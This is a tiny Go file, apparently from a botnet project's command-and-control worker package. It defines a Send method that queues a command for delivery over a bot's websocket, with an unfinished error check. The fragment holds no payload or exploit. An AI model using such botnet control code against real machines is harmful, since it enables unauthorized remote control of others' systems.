package ccworker

import (
	"github.com/adrianosela/botnet/lib/protocol"
)

// Send enqueues a command to be sent out through this bot's websocket conn
func (b *BotWorker) Send(cmd *protocol.Command) error {
	b.cmdOutChan <- cmd
	// FIXME: figure out what error to check
	return nil
}
